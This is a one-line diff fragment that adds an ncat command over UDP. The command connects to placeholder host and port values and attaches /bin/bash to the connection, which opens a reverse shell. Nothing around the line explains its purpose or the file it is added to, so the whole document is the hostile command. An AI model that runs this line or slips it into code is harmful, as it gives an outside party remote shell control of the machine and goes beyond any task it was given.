@@ -1,0 +1,1 @@
+ncat --udp SHELLDROP_HOST SHELLDROP_PORT -e /bin/bash
